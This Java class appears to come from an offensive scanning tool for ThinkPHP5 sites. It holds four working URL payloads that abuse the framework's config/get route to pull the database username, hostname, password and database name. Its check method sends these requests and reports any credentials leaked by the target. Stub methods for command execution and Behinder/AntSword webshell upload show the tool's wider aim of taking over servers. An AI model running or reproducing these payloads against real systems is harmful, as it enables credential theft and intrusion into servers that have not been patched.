package com.guitool.tpbomb.payload;

import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.UrlUtils;

import java.util.ArrayList;
import java.util.Objects;

public class TP5DatabaseLeak implements PayloadTemplate {
    final ArrayList<String> payloadList = new ArrayList<>(){{
        add("?s=index/think\\config/get&name=database.username");
        add("?s=index/think\\config/get&name=database.hostname");
        add("?s=index/think\\config/get&name=database.password");
        add("?s=index/think\\config/get&name=database.database");
    }};

    @Override
    public ResultUtils checkVulnerability(String url) {
        try {
            String username = UrlUtils.doGetSpecial(url + payloadList.get(0));
            String hostname = UrlUtils.doGetSpecial(url + payloadList.get(1));
            String password = UrlUtils.doGetSpecial(url + payloadList.get(2));
            String database = UrlUtils.doGetSpecial(url + payloadList.get(3));
            if (Objects.requireNonNull(username).length() >= 20) {
                username = null;
            }
            if (Objects.requireNonNull(hostname).length() >= 20) {
                hostname = null;
            }
            if (Objects.requireNonNull(password).length() >= 40) {
                password = null;
            }
            if (Objects.requireNonNull(database).length() >= 20) {
                database = null;
            }
            if (username == null && password == null && hostname == null && database == null) {
                return new ResultUtils(false, "ThinkPHP5 数据库信息泄露", "");
            } else {
                return new ResultUtils(false, "ThinkPHP5 数据库信息泄露", "username: " + username + ";password: " + password + ";hostname: " + hostname + ";database: " + database);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP5 数据库信息泄露", "");
    }

    @Override
    public ResultUtils executeVulnerability(String url, String command) {
        return null;
    }

    @Override
    public ResultUtils getBehinderShell(String url) {
        return null;
    }

    @Override
    public ResultUtils getAntswordShell(String url) {
        return null;
    }

}
